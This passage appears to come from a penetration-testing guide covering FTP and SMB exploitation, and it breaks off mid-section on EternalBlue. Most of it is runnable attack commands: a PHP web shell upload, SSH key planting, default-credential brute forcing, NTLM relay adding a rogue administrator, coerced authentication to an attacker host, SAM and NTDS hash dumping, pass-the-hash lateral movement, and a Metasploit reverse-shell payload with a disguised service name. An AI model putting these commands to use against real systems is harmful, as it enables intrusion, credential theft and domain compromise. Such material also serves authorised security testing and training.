# First character: file type (- = regular file, d = directory)
# Next 9 characters: permissions in groups of 3 (owner, group, others)

# Permission breakdown:
# r (read) = 4
# w (write) = 2
# x (execute) = 1

# Examples:
# -rw-r--r-- = 644 (owner: read+write, group: read, others: read)
# -rwxrwxrwx = 777 (all permissions for all users) [VULNERABLE]
# -rw-rw-rw- = 666 (read+write for all) [VULNERABLE]
# drwxrwxrwx = 777 directory (all can read/write/execute) [VULNERABLE]
```

#### Dangerous Permission Patterns

```bash
# World-writable files (anyone can modify)
-rw-rw-rw-  config.php
-rw-rw-rw-  database.yml
-rw-rw-rw-  .env

# World-readable private keys (anyone can read)
-rw-r--r--  .ssh/id_rsa
-rw-r--r--  private_key.pem

# World-writable directories (anyone can upload/delete)
drwxrwxrwx  /uploads
drwxrwxrwx  /public
drwxrwxrwx  /tmp

# Executable web files (PHP/CGI execution possible)
-rwxr-xr-x  upload.php
-rwxr-xr-x  index.cgi
```

#### Exploitation via Weak Permissions

**Configuration file modification:**

```bash
# Download world-writable config file
ftp> get config.php config.php.backup

# Modify locally to inject malicious configuration
# Example: change database connection to attacker database

# Upload modified file
ftp> put config.php

# Application loads compromised configuration
```

**Web shell upload:**

```bash
# If web-accessible directory is world-writable

# Create malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to FTP
ftp> put shell.php /var/www/html/shell.php

# Access via HTTP
curl http://target.com/shell.php?cmd=id
```

**SSH key manipulation:**

```bash
# If .ssh directory is accessible and writable

# Generate SSH key pair locally
ssh-keygen -t rsa -f attacker_key -N ""

# Upload public key to authorized_keys via FTP
ftp> put attacker_key.pub /home/user/.ssh/authorized_keys

# Connect via SSH using private key
ssh -i attacker_key user@target.com
```

**Binary/Script Replacement:**

```bash
# Identify executable scripts
ftp> ls -l /usr/local/bin/
ftp> ls -l /opt/scripts/

# If writable, replace with malicious version
# Create replacement script/binary
# Upload via FTP to replace original

# Next execution runs attacker's code
```

#### Permission Escalation via Weak Permissions

```bash
# If high-privilege user's home directory world-writable
drwxrwxrwx /root

# Upload malicious .bashrc or .profile
# Next time root logs in, attacker's code executes

# Or modify sudo configuration if writable
# Escalate privileges through sudo misconfig
```

### Default Credentials

FTP services frequently ship with default username/password combinations that administrators fail to change.

#### Common Default Credentials

**FTP Server Software:**

```
ProFTPD:
- Username: proftpd
- Password: proftpd

vsftpd:
- Username: ftp
- Password: (empty or ftp)

Pure-FTPd:
- Username: ftpadmin
- Password: ftpadmin

Serv-U:
- Username: admin
- Password: admin

FileZilla Server:
- Username: admin
- Password: admin
```

**Device FTP (Routers, Printers, NAS):**

```
Cisco Routers:
- Username: cisco
- Password: cisco

D-Link:
- Username: admin
- Password: admin or (empty)

Synology NAS:
- Username: admin
- Password: admin (or installation password)

Western Digital NAS:
- Username: admin
- Password: admin

HP Printers:
- Username: admin
- Password: admin or (empty)
```

**Legacy Systems:**

```
Microsoft FTP Service:
- Username: anonymous
- Password: (any)

Windows FTP:
- Username: ftp
- Password: (empty)
```

#### Testing Default Credentials

```bash
# Create list of default credentials
cat > defaults.txt << EOF
admin:admin
ftp:ftp
root:root
test:test
guest:guest
proftpd:proftpd
EOF

# Test against target
while IFS=: read username password; do
  ftp -n target.com << EOFTP
quote user $username
quote pass $password
quit
EOFTP
done < defaults.txt

# Listen for successful login messages
```

**Using hydra with default list:**

```bash
# Hydra has built-in common username/password list
hydra -L /usr/share/wordlists/common-users.txt \
      -P /usr/share/wordlists/common-passwords.txt \
      ftp://target.com
```

#### Post-Default Credential Access

```bash
# After successful login with default credentials
ftp> ls -la

# Often discovers sensitive configuration
# Access to backup files
# Ability to modify system files

# Check for other default credentials in configs
ftp> cat config.conf
ftp> cat settings.ini

# Lateral movement opportunities
```

### FTP Misconfiguration

FTP servers often suffer from configuration weaknesses that expose sensitive data or allow unauthorized operations.

#### Command Injection via FTP

**FTP command line interpretation:**

```bash
# If FTP interprets shell metacharacters

# Payload: inject commands through FTP parameters
ftp> mkdir "; id; echo "

# Some FTP implementations execute shell commands
# Reveals system information
```

#### Symbolic Link Following

```bash
# If FTP server follows symbolic links

# Symbolic link to sensitive system files
ftp> ls -l
# lrwxrwxrwx link_name -> /etc/passwd

# Retrieve through symlink
ftp> get link_name
# Downloads /etc/passwd through FTP

# Download sensitive files outside FTP root
/etc/shadow
/etc/sudoers
/root/.ssh/id_rsa
/var/log/auth.log
```

#### Directory Traversal

```bash
# FTP path traversal
ftp> cd ../../etc/
ftp> ls

# Upload files outside intended directory
ftp> put shell.php ../../var/www/html/shell.php

# Modern FTP servers typically prevent this
# Some older implementations vulnerable
```

#### FTP Root Jail Bypass

```bash
# Escape FTP chroot jail

# Chroot configuration should prevent access outside /home/ftp/
# Misconfigured FTP may allow escape

ftp> cd ..
# If successful, accessing parent directories outside jail

# Exploit via symlinks in jail directory
ln -s / /home/ftp/root_access
# User sees entire filesystem through FTP
```

#### Dangerous FTP Command Support

```bash
# SITE command (execute system commands)
ftp> quote SITE CHMOD 644 /etc/passwd

# If SITE command enabled and misconfigured
# Execute arbitrary shell commands

# EXEC command (execute programs)
ftp> quote EXEC command

# Some FTP services support EXEC for remote execution
```

#### Information Disclosure Misconfigurations

**Verbose banner information:**

```bash
# FTP server reveals too much information in banner
nc -v ftp.target.com 21

# Output might show:
# 220 Welcome to ProFTPD 1.3.4a Server (Debian)
# 220 Built-in ftp server ready

# Version information enables targeted exploitation
```

**File modification times and sizes:**

```bash
# FTP LIST command reveals exact file sizes and modification times
ftp> ls -la

# Infers system activity, file changes, potential backup schedules
# Timing information useful for attack planning
```

**User enumeration:**

```bash
# If FTP reveals valid usernames in error messages
ftp> quote user admin
# 331 Password required for admin

# Indicates user exists

ftp> quote user nonexistent12345
# 530 User nonexistent12345 not found

# Enumeration technique to discover valid usernames
```

#### Race Condition Exploitation

**File replacement race condition:**

```bash
# Some FTP implementations have race conditions during upload

# Scenario: Upload file, during processing, replace with malicious version
# Application processes malicious version

# Automated exploitation:
# Upload large file
# Immediately upload replacement while first still processing
# Timing-dependent success
```

#### FTP Data Interception

```bash
# FTP control connection (port 21) often encrypted
# FTP data connection (port 20 or dynamic) often unencrypted

# Capture data traffic
tcpdump -i eth0 port 20

# File contents transmitted in plaintext (if not SFTP/FTPS)
# Credentials visible in control connection if not encrypted

# Recommendation: Use SFTP or FTPS
# Verify connection uses TLS/SSL
```

#### Null Byte Injection in FTP

```bash
# [Unverified] Some legacy FTP implementations vulnerable to null bytes

# FTP command injection via null byte
ftp> get filename%00.txt

# Null byte truncates filename parsing
# Retrieved file might be different than expected

# Bypass extension filters
ftp> put shell.php%00.jpg
# Uploaded as shell.php instead of .jpg

# Typically fixed in modern FTP servers
```

#### FTP Bounce Privilege Escalation

```bash
# Use FTP server's elevated privileges to access restricted files

# FTP server runs as root (misconfiguration)
# Access restricted system files through FTP connection

ftp> get /root/.ssh/id_rsa

# Or modify system files
ftp> put malicious_config /etc/critical_config

# Compromise system as root
```

#### SFTP/FTPS Misconfigurations

**Self-signed certificate trust:**

```bash
# SFTP over SSH with weak key exchange
# FTPS with self-signed certificates (accepts without verification)

# Enables man-in-the-middle attacks
```

**Certificate pinning bypass:**

```bash
# Some clients misconfigure certificate validation
# Accept any certificate regardless of validity

# Attacker intercepts connection with own certificate
# Captures credentials or modifies data in transit
```

---

**Exploitation workflow summary for FTP:**

1. **Scan for FTP:** Identify port 21 or alternative FTP ports
2. **Test anonymous access:** Attempt unauthenticated connection
3. **Enumerate files:** List directories for sensitive data
4. **Brute force credentials:** If anonymous fails, attempt common/default credentials
5. **Analyze permissions:** Identify world-writable files or directories
6. **Exploit misconfigurations:** Leverage weak security settings for unauthorized access
7. **Post-exploitation:** Extract data, upload shells, modify configurations for persistence

FTP exploitation often serves as entry point for lateral movement, system access, or data exfiltration in comprehensive penetration test scenarios.

---

## SMB/CIFS Exploitation

### Null Session Exploitation

Null session attacks exploit unauthenticated SMB connections to enumerate information about Windows systems. This technique is more prevalent on older Windows systems but can still be found in misconfigured environments.

**Basic Null Session Connection**

```bash
# Test null session connectivity
smbclient -N -L //target_ip

# Connect with explicit null credentials
smbclient //target_ip/IPC$ -N

# Using rpcclient for null session
rpcclient -U "" -N target_ip

# Using net command (if available)
net use \\target_ip\IPC$ "" /user:""

# Test with smbmap
smbmap -H target_ip -u "" -p ""

# Using enum4linux for comprehensive null session enumeration
enum4linux -a target_ip
```

**User Enumeration via Null Session**

```bash
# Enumerate users with rpcclient
rpcclient -U "" -N target_ip -c "enumdomusers"
rpcclient -U "" -N target_ip -c "querydispinfo"
rpcclient -U "" -N target_ip -c "queryuser 500"  # RID 500 = Administrator
rpcclient -U "" -N target_ip -c "queryuser 501"  # RID 501 = Guest

# Enumerate all users by RID cycling
for rid in {500..550}; do
  rpcclient -U "" -N target_ip -c "queryuser $rid" 2>/dev/null | grep -E "(User Name|Description)"
done

# Extract usernames only
rpcclient -U "" -N target_ip -c "enumdomusers" | cut -d'[' -f2 | cut -d']' -f1

# Get detailed user information
rpcclient -U "" -N target_ip << EOF
enumdomusers
querydispinfo
enumdomgroups
EOF

# Using enum4linux for user enumeration
enum4linux -U target_ip

# Using crackmapexec
crackmapexec smb target_ip -u '' -p '' --users
```

**Group Enumeration via Null Session**

```bash
# Enumerate domain groups
rpcclient -U "" -N target_ip -c "enumdomgroups"

# Query specific group membership
rpcclient -U "" -N target_ip -c "querygroup 512"  # Domain Admins
rpcclient -U "" -N target_ip -c "querygroup 513"  # Domain Users
rpcclient -U "" -N target_ip -c "querygroup 544"  # Administrators

# Get members of specific group
rpcclient -U "" -N target_ip -c "querygroupmem 512"

# Enumerate local groups
rpcclient -U "" -N target_ip -c "enumalsgroups builtin"

# Using enum4linux
enum4linux -G target_ip
```

**Share Enumeration via Null Session**

```bash
# List shares with null session
smbclient -N -L //target_ip

# Detailed share information
rpcclient -U "" -N target_ip -c "netshareenum"
rpcclient -U "" -N target_ip -c "netshareenumall"
rpcclient -U "" -N target_ip -c "netsharegetinfo C$"

# Using smbmap
smbmap -H target_ip -u "" -p ""
smbmap -H target_ip -u "" -p "" -r  # Recursive listing

# Using enum4linux
enum4linux -S target_ip

# Using crackmapexec
crackmapexec smb target_ip -u '' -p '' --shares
```

**Domain/Workgroup Information**

```bash
# Get domain information
rpcclient -U "" -N target_ip -c "lsaquery"
rpcclient -U "" -N target_ip -c "querydominfo"
rpcclient -U "" -N target_ip -c "enumdomains"

# Get SID information
rpcclient -U "" -N target_ip -c "lsaenumsid"
rpcclient -U "" -N target_ip -c "lookupsids <SID>"

# Using enum4linux for domain info
enum4linux -d target_ip

# Get password policy via null session
rpcclient -U "" -N target_ip -c "getdompwinfo"

# Using polenum
polenum target_ip -u "" -p ""
```

**Password Policy Enumeration**

```bash
# Get password policy
rpcclient -U "" -N target_ip << EOF
getdompwinfo
EOF

# Detailed password policy via enum4linux
enum4linux -P target_ip

# Using crackmapexec
crackmapexec smb target_ip -u '' -p '' --pass-pol

# Using ldapsearch if LDAP is exposed
ldapsearch -x -h target_ip -s base -b "" "(objectClass=*)" passwordPolicies
```

**Null Session Mitigation Check**

```bash
# Check if RestrictAnonymous is set
rpcclient -U "" -N target_ip -c "lsaquery" 2>&1 | grep -i "access denied"

# Test multiple null session vectors
echo "[*] Testing null session access..."
smbclient -N -L //target_ip 2>&1 | grep -i "anonymous"
rpcclient -U "" -N target_ip -c "srvinfo" 2>&1
enum4linux -a target_ip | grep -i "access denied\|session setup failed"
```

### Shares Enumeration and Access

**Comprehensive Share Discovery**

```bash
# Basic share enumeration
smbclient -L //target_ip -U username%password
smbclient -L //target_ip -U username

# Using smbmap with credentials
smbmap -H target_ip -u username -p password
smbmap -H target_ip -u username -p password -r  # Recursive
smbmap -H target_ip -u username -p password -R  # Recursive with pattern
smbmap -H target_ip -u username -p password -A .txt  # Download all .txt files

# Using crackmapexec
crackmapexec smb target_ip -u username -p password --shares
crackmapexec smb target_ip -u username -p password --spider C$ --pattern txt
crackmapexec smb target_ip -u username -p password --spider SHARE --regex .

# Using enum4linux-ng (modern version)
enum4linux-ng target_ip -A -u username -p password

# Nmap SMB scripts
nmap -p445 --script smb-enum-shares --script-args smbusername=username,smbpassword=password target_ip
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=username,smbpassword=password target_ip
```

**Accessing Shares**

```bash
# Connect to specific share
smbclient //target_ip/share_name -U username%password

# Mount SMB share
mkdir /mnt/smb_share
mount -t cifs //target_ip/share_name /mnt/smb_share -o username=user,password=pass

# Mount with domain credentials
mount -t cifs //target_ip/share_name /mnt/smb_share -o username=user,password=pass,domain=DOMAIN

# Access with specific SMB version
smbclient //target_ip/share_name -U username%password --option='client min protocol=NT1'
smbclient //target_ip/share_name -U username%password -m SMB2
smbclient //target_ip/share_name -U username%password -m SMB3

# Using impacket's smbclient.py
smbclient.py username:password@target_ip
smbclient.py DOMAIN/username:password@target_ip
```

**Advanced Share Enumeration**

```bash
# Recursively list all files in share
smbclient //target_ip/share_name -U username%password -c "recurse ON;ls"

# Search for specific files
smbclient //target_ip/share_name -U username%password -c "recurse ON;ls *password*"
smbclient //target_ip/share_name -U username%password -c "recurse ON;ls *.txt"
smbclient //target_ip/share_name -U username%password -c "recurse ON;ls *.config"

# Download entire share
smbclient //target_ip/share_name -U username%password -c "prompt OFF;recurse ON;mget *"

# Using smbget for recursive downloads
smbget -R smb://target_ip/share_name -U username%password

# Spider shares for sensitive files
crackmapexec smb target_ip -u username -p password --spider SHARE --pattern password
crackmapexec smb target_ip -u username -p password --spider C$ --pattern .config
```

**Administrative Share Access**

```bash
# Access admin shares (requires admin privileges)
smbclient //target_ip/C$ -U administrator%password
smbclient //target_ip/ADMIN$ -U administrator%password
smbclient //target_ip/IPC$ -U administrator%password

# Test admin share access with crackmapexec
crackmapexec smb target_ip -u administrator -p password --shares

# List admin share contents
smbclient //target_ip/C$ -U administrator%password -c "ls"
smbclient //target_ip/C$/Windows/System32/config -U administrator%password -c "ls"

# Download SAM/SYSTEM/SECURITY files
smbclient //target_ip/C$ -U administrator%password << EOF
cd Windows/System32/config
get SAM
get SYSTEM
get SECURITY
EOF
```

**Hidden Share Discovery**

```bash
# Some shares may be hidden (ending with $)
# Enumerate with various tools
smbmap -H target_ip -u username -p password | grep '\$$'

# Try common hidden shares
smbclient //target_ip/SHARE$ -U username%password
smbclient //target_ip/NETLOGON$ -U username%password
smbclient //target_ip/SYSVOL$ -U username%password
smbclient //target_ip/print$ -U username%password

# Brute force hidden share names
for share in $(cat /usr/share/seclists/Discovery/Infrastructure/common-shares.txt); do
  smbclient //target_ip/$share$ -U username%password -c "ls" 2>&1 | grep -v "NT_STATUS"
done
```

**Share Permission Testing**

```bash
# Test write permissions
echo "test" > test.txt
smbclient //target_ip/share_name -U username%password -c "put test.txt"

# Using crackmapexec to test permissions
crackmapexec smb target_ip -u username -p password -M spider_plus
crackmapexec smb target_ip -u username -p password --shares | grep -E "READ|WRITE"

# Check share permissions with smbmap
smbmap -H target_ip -u username -p password | grep -E "READ|WRITE"

# Test specific file operations
smbclient //target_ip/share_name -U username%password << EOF
mkdir test_dir
cd test_dir
put test.txt
rm test.txt
cd ..
rmdir test_dir
EOF
```

**Extracting Sensitive Files from Shares**

```bash
# Search for common sensitive files
crackmapexec smb target_ip -u username -p password --spider SHARE --pattern "pass|cred|secret|key|config|backup"

# Download specific file types
smbmap -H target_ip -u username -p password -A ".txt,.xml,.config,.ini,.bat,.ps1"

# Search for and download specific patterns
find_and_download() {
  smbclient //target_ip/share_name -U username%password -c "recurse ON;prompt OFF;mget *password*"
  smbclient //target_ip/share_name -U username%password -c "recurse ON;prompt OFF;mget *config*"
  smbclient //target_ip/share_name -U username%password -c "recurse ON;prompt OFF;mget *.kdbx"
}
find_and_download

# Using grep patterns with smbclient
smbclient //target_ip/share_name -U username%password -c "recurse ON;ls" | grep -iE "password|credential|secret|backup|database"
```

### SMB Relay Attacks

SMB relay attacks intercept and relay authentication attempts to gain unauthorized access. These attacks exploit the authentication mechanisms in SMB/NTLM.

**Setting Up Responder for Credential Capture**

```bash
# Basic Responder setup
responder -I eth0 -wrf

# Responder with analysis mode (passive, no poisoning)
responder -I eth0 -A

# Responder with specific services
responder -I eth0 -w -r -f  # WPAD, LLMNR, mDNS

# Disable SMB and HTTP servers (for relay attacks)
# Edit /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off
responder -I eth0

# Using Responder with verbose output
responder -I eth0 -wrf -v

# Log file location
tail -f /usr/share/responder/logs/Responder-Session.log
tail -f /usr/share/responder/logs/*.txt
```

**SMB Relay with ntlmrelayx**

```bash
# Basic SMB relay to single target
ntlmrelayx.py -t smb://target_ip -smb2support

# Relay to multiple targets from file
ntlmrelayx.py -tf targets.txt -smb2support

# Relay with command execution
ntlmrelayx.py -t smb://target_ip -smb2support -c "whoami"
ntlmrelayx.py -t smb://target_ip -smb2support -c "net user hacker Password123! /add"
ntlmrelayx.py -t smb://target_ip -smb2support -c "net localgroup administrators hacker /add"

# Relay with SOCKS proxy (for interactive access)
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Use proxychains with SOCKS proxy created by ntlmrelayx
proxychains smbclient //target_ip/C$ -U DOMAIN/user

# Relay to dump SAM database
ntlmrelayx.py -t smb://target_ip -smb2support --dump-sam

# Relay to dump LSASS
ntlmrelayx.py -t smb://target_ip -smb2support --dump-lsass

# Relay with enumeration
ntlmrelayx.py -t smb://target_ip -smb2support -e

# Relay to execute PowerShell payload
ntlmrelayx.py -t smb://target_ip -smb2support -c "powershell -enc <BASE64_PAYLOAD>"
```

**Advanced SMB Relay Techniques**

```bash
# Relay to LDAP for domain enumeration
ntlmrelayx.py -t ldap://dc_ip --escalate-user lowpriv_user

# Relay to LDAPS (secure LDAP)
ntlmrelayx.py -t ldaps://dc_ip --escalate-user lowpriv_user

# Relay with privilege escalation
ntlmrelayx.py -t ldap://dc_ip --escalate-user normaluser --add-computer

# Relay to create machine account
ntlmrelayx.py -t ldaps://dc_ip --add-computer EVILCOMPUTER --delegate-access

# Relay with resource-based constrained delegation
ntlmrelayx.py -t ldaps://dc_ip --delegate-access --escalate-user lowpriv_user

# Multi-relay attack (SMB to HTTP/LDAP/etc)
ntlmrelayx.py -t http://target_ip/admin -smb2support
ntlmrelayx.py -t ldap://dc_ip -smb2support
```

**Triggering Authentication for Relay**

```bash
# Use Responder to trigger authentication via LLMNR/NBT-NS poisoning
responder -I eth0 -wrf

# Using mitm6 for IPv6 DNS takeover
mitm6 -i eth0 -d domain.local

# Combine mitm6 with ntlmrelayx
# Terminal 1:
mitm6 -d domain.local

# Terminal 2:
ntlmrelayx.py -6 -t ldaps://dc_ip -wh attacker-wpad -l loot

# Force authentication with printerbug
python3 printerbug.py domain.local/user:password@target_ip attacker_ip

# Force authentication with PetitPotam
python3 PetitPotam.py attacker_ip target_ip
python3 PetitPotam.py -u username -p password attacker_ip target_ip

# Force authentication via SMB link file
cat > "@test.lnk" << EOF
[InternetShortcut]
URL=file://attacker_ip/share
EOF
# Place this file on accessible share

# Create malicious .SCF file
cat > "@test.scf" << EOF
[Shell]
Command=2
IconFile=\\\\attacker_ip\\share\\test.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

**SMB Signing Detection and Bypass**

```bash
# Check if SMB signing is required
nmap -p445 --script smb-security-mode target_ip
nmap -p445 --script smb2-security-mode target_ip

# Using crackmapexec to check signing
crackmapexec smb target_ip --gen-relay-list relay_targets.txt

# Check multiple targets for relay opportunities
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Identify targets without SMB signing
nmap -p445 --script smb2-security-mode 192.168.1.0/24 | grep -B 10 "Message signing enabled but not required"

# Using RunFinger to identify relay targets
python3 RunFinger.py -i 192.168.1.0/24
```

**Capturing and Cracking Relayed Hashes**

```bash
# Hashes captured by Responder are saved to:
ls -la /usr/share/responder/logs/

# Extract NTLMv2 hashes
cat /usr/share/responder/logs/*.txt | grep "NTLMv2"

# Crack captured hashes with hashcat
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with John the Ripper
john --format=netntlmv2 captured_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# [Inference] If relay is successful, ntlmrelayx may provide direct access without needing to crack
```

**MultiRelay (Legacy Tool)**

```bash
# [Unverified] MultiRelay is older, ntlmrelayx is preferred
# If using MultiRelay:
python MultiRelay.py -t target_ip -u ALL

# With command execution
python MultiRelay.py -t target_ip -u ALL -c "net user"
```

### Pass-the-Hash over SMB

Pass-the-Hash (PtH) allows authentication using NTLM hash instead of plaintext password, bypassing the need to crack hashes.

**Pass-the-Hash with Various Tools**

```bash
# Using pth-winexe (pass-the-hash toolkit)
pth-winexe -U DOMAIN/user%hash //target_ip cmd.exe
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //target_ip cmd.exe

# Using smbclient with hash
smbclient //target_ip/share_name --pw-nt-hash -U username%ntlm_hash

# Using crackmapexec for PtH
crackmapexec smb target_ip -u username -H ntlm_hash
crackmapexec smb target_ip -u username -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
crackmapexec smb target_ip -u username -H ntlm_hash --local-auth  # Local account
crackmapexec smb target_ip -u username -H ntlm_hash -d DOMAIN  # Domain account

# Command execution with PtH via crackmapexec
crackmapexec smb target_ip -u administrator -H ntlm_hash -x "whoami"
crackmapexec smb target_ip -u administrator -H ntlm_hash -X '$PSVersionTable'  # PowerShell
```

**Impacket Suite Pass-the-Hash**

```bash
# Using impacket's smbexec.py
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash username@target_ip
smbexec.py -hashes :ntlm_hash DOMAIN/username@target_ip

# Using impacket's wmiexec.py
wmiexec.py -hashes :ntlm_hash username@target_ip
wmiexec.py -hashes :ntlm_hash DOMAIN/username@target_ip

# Using impacket's psexec.py
psexec.py -hashes :ntlm_hash username@target_ip
psexec.py -hashes :ntlm_hash DOMAIN/username@target_ip cmd.exe

# Using impacket's atexec.py (scheduled task execution)
atexec.py -hashes :ntlm_hash username@target_ip "whoami"

# Using impacket's dcomexec.py
dcomexec.py -hashes :ntlm_hash username@target_ip

# Using impacket's smbclient.py
smbclient.py -hashes :ntlm_hash username@target_ip
```

**Extracting Hashes for Pass-the-Hash**

```bash
# Dump SAM hashes (requires admin access to target)
secretsdump.py username:password@target_ip
secretsdump.py -hashes :ntlm_hash username@target_ip

# Dump NTDS.dit (Domain Controller)
secretsdump.py DOMAIN/username:password@dc_ip -just-dc
secretsdump.py -hashes :ntlm_hash DOMAIN/username@dc_ip -just-dc

# Extract from local SAM file
samdump2 SYSTEM SAM

# Using impacket's secretsdump with output formats
secretsdump.py username:password@target_ip -outputfile hashes
# Creates: hashes.ntds, hashes.sam, hashes.secrets

# Dump specific user hash
secretsdump.py -hashes :ntlm_hash username@target_ip -just-dc-user administrator

# Parse secretsdump output
cat hashes.ntds | cut -d':' -f1,4
```

**Pass-the-Hash with Evil-WinRM**

```bash
# Install evil-winrm if not present
gem install evil-winrm

# Connect using NTLM hash (requires WinRM enabled)
evil-winrm -i target_ip -u username -H ntlm_hash
evil-winrm -i target_ip -u username -H ntlm_hash -s /opt/scripts -e /opt/exes

# Upload and execute files
evil-winrm -i target_ip -u administrator -H ntlm_hash
upload /path/to/file.exe
./file.exe
```

**Pass-the-Hash Across Network**

```bash
# Spray hash across multiple targets
crackmapexec smb 192.168.1.0/24 -u administrator -H ntlm_hash
crackmapexec smb targets.txt -u administrator -H ntlm_hash --continue-on-success

# Test local admin access with hash
crackmapexec smb 192.168.1.0/24 -u administrator -H ntlm_hash --local-auth

# Execute commands across multiple targets
crackmapexec smb 192.168.1.0/24 -u administrator -H ntlm_hash -x "whoami"

# Check admin access
crackmapexec smb 192.168.1.0/24 -u administrator -H ntlm_hash | grep "Pwn3d!"
```

**Overpass-the-Hash (Pass-the-Key)**

```bash
# Request TGT using NTLM hash
getTGT.py DOMAIN/username -hashes :ntlm_hash

# Export ticket
export KRB5CCNAME=/path/to/username.ccache

# Use ticket with impacket tools
psexec.py DOMAIN/username@target_fqdn -k -no-pass
smbexec.py DOMAIN/username@target_fqdn -k -no-pass
wmiexec.py DOMAIN/username@target_fqdn -k -no-pass

# Using Mimikatz to perform overpass-the-hash (on Windows)
# sekurlsa::pth /user:username /domain:DOMAIN /ntlm:hash /run:cmd.exe
```

**Pass-the-Hash with Mimikatz (Windows)**

```bash
# Note: These commands run on Windows, not Kali
# Included for reference in case you gain access to Windows system

# Enable SeDebugPrivilege
# privilege::debug

# Pass-the-Hash with Mimikatz
# sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:hash /run:cmd.exe
# sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:hash /run:powershell.exe

# From elevated shell, access remote system
# net use \\target_ip\C$ /user:Administrator
# dir \\target_ip\C$
```

**Advanced Pass-the-Hash Scenarios**

```bash
# Using PTH to pivot through network
crackmapexec smb target1_ip -u administrator -H ntlm_hash -x "net view \\\\target2_ip"

# Chain PtH for lateral movement
# 1. PtH to Target1
smbexec.py -hashes :ntlm_hash admin@target1_ip

# 2. Dump credentials from Target1
secretsdump.py -hashes :ntlm_hash admin@target1_ip

# 3. Use new hashes for Target2
smbexec.py -hashes :new_ntlm_hash admin@target2_ip

# Using PtH with SMB shares
mount.cifs //target_ip/C$ /mnt/remote -o username=admin,password=ntlm_hash,sec=ntlmssp

# PtH for file operations
smbclient.py -hashes :ntlm_hash admin@target_ip
# use C$
# ls
# get file.txt
```

**Pass-the-Hash Detection and Logging**

```bash
# [Inference] PtH generates specific Windows Event IDs
# Event ID 4624 (Logon Type 3 with NTLM)
# Event ID 4648 (Explicit credential use)
# Check if activity is logged by reviewing target after testing

# Test logging by performing PtH and checking Windows Event Logs
crackmapexec smb target_ip -u administrator -H ntlm_hash -x "wevtutil qe Security /c:5 /rd:true /f:text /q:\"*[System[(EventID=4624)]]\""
```

**Pass-the-Hash Mitigation Bypass**

```bash
# [Inference] If KB2871997 (PTH mitigations) is applied:
# - Local admin accounts (except RID 500) are restricted
# - Test with domain accounts or RID 500 built-in admin

# Try with built-in administrator (RID 500)
crackmapexec smb target_ip -u Administrator -H ntlm_hash --local-auth

# Try with domain account
crackmapexec smb target_ip -u DOMAIN/username -H ntlm_hash

# Test if account is in "Protected Users" group (PtH protected)
crackmapexec smb dc_ip -u admin -p password -x "net user username /domain | findstr 'Protected Users'"
```

**Dumping and Using Cached Credentials**

```bash
# Extract cached domain credentials (requires admin on target)
secretsdump.py -hashes :ntlm_hash admin@target_ip -just-dc-user DOMAIN\\username

# Dump NTDS.dit for all domain hashes
secretsdump.py -hashes :ntlm_hash DOMAIN/admin@dc_ip -just-dc -outputfile domain_hashes

# Extract specific information
secretsdump.py -hashes :ntlm_hash admin@target_ip -just-dc-ntlm  # NTLM hashes only
secretsdump.py -hashes :ntlm_hash admin@target_ip -history  # Include password history

# Use dumped hashes for further PtH attacks
cat domain_hashes.ntds | grep "Administrator" | cut -d':' -f4
crackmapexec smb 192.168.1.0/24 -u Administrator -H <extracted_hash>
```

---

**Important Testing Considerations:**

1. **SMB Signing** - When enabled and required, SMB relay attacks will fail. Always check signing status first
2. **[Inference]** Pass-the-Hash works with NTLM authentication but not Kerberos - use overpass-the-hash for Kerberos environments
3. **Network Segmentation** - Test relay attacks within the same network segment for best results
4. **Administrative Privileges** - Many SMB exploits require local admin rights on target systems
5. **Logging** - PtH and relay attacks generate security logs; be aware of detection in real environments

### Eternal Blue Exploitation (MS17-010)

EternalBlue exploits a vulnerability in Microsoft's SMBv1 protocol implementation, allowing remote code execution. This vulnerability (CVE-2017-0144) was used in the WannaCry ransomware attack.

**Vulnerability Detection:**

1. **Using Nmap NSE scripts**:

```bash
# Scan for MS17-010 vulnerability
nmap -p445 --script smb-vuln-ms17-010 target.com

# Comprehensive SMB vulnerability scan
nmap -p445 --script smb-vuln* target.com

# Scan subnet
nmap -p445 --script smb-vuln-ms17-010 192.168.1.0/24 -oA eternalblue_scan

# Check specific host with verbose output
nmap -p445 --script smb-vuln-ms17-010 -Pn -v target.com
```

2. **Using Metasploit auxiliary module**:

```bash
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
set THREADS 10
run

# Scan multiple hosts
set RHOSTS 192.168.1.0/24
run
```

3. **Manual detection with Python script**:

```bash
# Using checker script
wget https://github.com/worawit/MS17-010/raw/master/checker.py
python checker.py 192.168.1.100

# Check multiple targets
for ip in $(cat targets.txt); do
  echo "[*] Checking $ip"
  python checker.py $ip
done
```

4. **Using crackmapexec**:

```bash
# Check for MS17-010
crackmapexec smb 192.168.1.100 -u '' -p '' -M ms17-010

# Scan subnet
crackmapexec smb 192.168.1.0/24 -u '' -p '' -M ms17-010
```

**Exploitation Techniques:**

1. **Using Metasploit (most reliable method)**:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444

# For Windows 7 x64
set target 0

# For Windows Server 2008 R2 x64
set target 1

# Verify target OS first
show targets
exploit

# If successful
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
```

2. **Alternative Metasploit module (psexec variant)**:

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set SERVICE_NAME XblAuthManager  # Less suspicious service name
set SERVICE_DESCRIPTION "Xbox Live Auth Manager"
exploit
```

3. **Using AutoBlue-MS17-010** [Inference - standalone Python exploit]:

```bash
